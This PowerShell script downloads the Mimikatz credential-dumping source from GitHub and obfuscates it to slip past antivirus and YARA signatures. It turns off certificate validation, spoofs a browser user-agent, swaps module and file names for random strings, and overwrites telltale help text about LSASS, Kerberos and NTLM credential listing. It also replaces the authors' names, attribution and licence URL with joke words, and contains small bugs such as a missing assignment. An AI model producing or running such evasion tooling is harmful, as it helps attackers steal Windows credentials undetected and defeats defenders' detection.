[CmdletBinding()] Param()

Write-Verbose "Downloading......"

$Domain = ""
$User = ""
$Password = ""

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$webClient = New-Object System.NET.WebClient
$webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3578.108 Safari/537.36")
$mimiURL = "https://github.com/gentilkiwi/mimikatz/archive/master.zip"
$destMimi = (Get-Location).Path + "\mimikatz-master.zip"

$webClient.DownloadFile($mimiURL, $destMimi)


Write-Verbose "Saving to `n`t$destKatz `n`t$destMimi"
Expand-Archive $destMimi ($destMimi -replace ".zip")

Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip {
    param([string]$zipfile, [string]$outpath)
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

# Download path
$mimipath = (get-location).path + "\mimikatz-master"

# mimikatz path
$mimikatz =  -join ((97..122) |Get-Random -Count 5 |ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "mimikatz" } |Rename-Item -NewName { $_.name -replace "mimikatz", "$mimikatz" }

# mimilib path
$mimilib =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "mimilib" } |Rename-Item -NewName { $_.name -replace "mimilib", "$mimilib" }

# mimidrv path
$mimidrv =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "mimidrv" } |Rename-Item -NewName { $_.name -replace "mimidrv", "$mimidrv" }

# mimilove path
$mimilove =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "mimilove" } |Rename-Item -NewName { $_.name -replace "mimilove", "$mimilove" }

# mimispool path
$mimispool =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "mimispool" } |Rename-Item -NewName { $_.name -replace "mimispool", "$mimispool" }

# kiwi
$kiwi -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "kiwi" } |Rename-Item -NewName { $_.name -replace "kiwi", "$kiwi" }

# kuhl
$kuhl =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "kuhl" } |Rename-Item -NewName { $_.name -replace "kuhl", "$kuhl" }

# kull
$kull =  -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "kull" } |Rename-Item -NewName { $_.name -replace "kull", "$kull" }
Get-ChildItem -recurse $mimipath |Where-Object { $_.name -match "_m_" } |Rename-Item -NewName { $_.name -replace "_m_", "_d_" }

# recursive rename strings
$comment =  -join ((97..122) |Get-Random -Count 10 |ForEach-Object {[char]$_})
$mimipath = (get-location).path
$allfiles = Get-ChildItem $mimipath -recurse | Where-Object { $_.Attributes -notmatch 'directory' } | `
             Where-Object { $_.Extension -match '\.c|\.cs|\.cmd|\.def|\.filters|\.h|\.idl|\.rc|\.sln|\.tlog|\.vcxproj|\.yar'  }
  foreach ($file in $allfiles) {
        (Get-Content $file.PSPath) | `
        ForEach-Object { $_ -replace "Benjamin", "Stan S. Stanman" `
							-replace "DELPY", "LeChucks" `
							-replace "gentil", "Octothorpe" `
							-replace "gentilkiwi", "Draggle" `
							-replace "oe.eo", "Griswold Goodsoup" `
							-replace ".letoux", "Guybrush Threepwood" `
							-replace "gmail", "Skully" `
							-replace "https://blog.gentilkiwi.com", "Sozzled" `
							-replace "https://creativecommons.org/licenses/by/4.0/", "Firkin" `
							-replace "Vincent", "Fartlek" `
							-replace "LE TOUX", "Spondulicks" `
							-replace "vincent.letoux@gmail.com", "Oxter" `
							-replace "https://pingcastle.com", "Yemele" `
							-replace "https://mysmartlogon.com", "Spondulicks" `
							-replace "Build with love for POC only", "Herman Toothrot" `
							-replace "2007", "2023" `
							-replace "2021", "2023" `
							-replace "2021", "2023" `
							-replace "Lists LM & NTLM credentials", $comment `
							-replace "List Credentials Manager", $comment `
							-replace "List Cached MasterKeys", $comment `
							-replace "List Kerberos Encryption Keys", $comment `
							-replace "List Kerberos tickets", $comment `
							-replace "Preferred Backup Master keys", $comment `
							-replace "Antisocial", $comment `
							-replace "Pass-the-hash", $comment `
							-replace "Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials", $comment `
							-replace "Switch (or reinit) to LSASS minidump context", $comment `
							-replace "Switch (or reinit) to LSASS process  context", $comment `
							-replace "Switch (or reinit) to LSASS process  context", $comment `
							-replace "Lists SSP credentials", $comment `
							-replace "Lists CloudAp credentials", $comment `
							-replace "Lists LiveSSP credentials", $comment `
							-replace "Lists TsPkg credentials", $comment `
							-replace "Lists Kerberos credentials", $comment `
							-replace "Lists WDigest credentials", $comment `
							-replace "Lists LM & NTLM credentials", $comment `
							-replace "Some commands to enumerate credentials...", $comment `
							-replace "DPAPI service not in LSASS memory", $comment `
							-replace "Pattern not found in DPAPI service", $comment `
							-replace "KDC service not in LSASS memory",  $comment `
							-replace "Unable to find KDC pattern in LSASS memory", $comment `
							-replace "Pattern not found in KDC service", $comment `
							-replace "KDC service not in LSASS memory", $comment `
							-replace "Token Impersonation", $comment `
							-replace "Size error for NtlmHash LsaIso output", $comment `
							-replace "Unknown version in Kerberos credentials structure", $comment `
							-replace "kiwi", $kiwi `
							-replace "mimikatz", $mimikatz `
							-replace "mimilib", $mimilib `
							-replace "mimidrv", $mimidrv `
							-replace "mimilove", $mimilove `
							-replace "mimispool", $mimispool `
							-replace "_m_", "_k_" `
							-replace "kull", $kull `
							-replace "kuhl", $kuhl `
						} | `
        Set-Content $file.PSPath
    }
